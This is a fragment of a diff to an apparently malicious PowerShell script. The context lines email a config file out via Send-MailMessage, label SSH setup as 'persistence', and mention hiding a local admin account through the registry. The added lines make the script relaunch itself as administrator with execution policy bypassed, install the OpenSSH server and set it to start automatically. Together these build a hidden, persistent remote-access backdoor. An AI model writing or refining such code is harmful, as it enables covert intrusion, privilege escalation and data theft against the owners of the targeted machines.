@@ -54,10 +54,22 @@ Send-MailMessage -From $email -To $email -Subject $configfile -Attachment $confi
 mkdir $path
 Set-Location $path
 
-#enabling persistence ssh
+# Self-elevate if not admin
+if (-not ([Security.Principal.WindowsPrincipal] `
+    [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
+    [Security.Principal.WindowsBuiltInRole]::Administrator))
+{
+    Start-Process powershell.exe `
+        -Verb RunAs `
+        -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    exit
+}
+
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
-Set-Service -Name sshd -StartupType 'Automatic'
+Set-Service -Name sshd -StartupType Automatic
+
+Write-Host "OpenSSH Server installation completed."
 
 # registry to hide local admin
 $reg_file = random_text
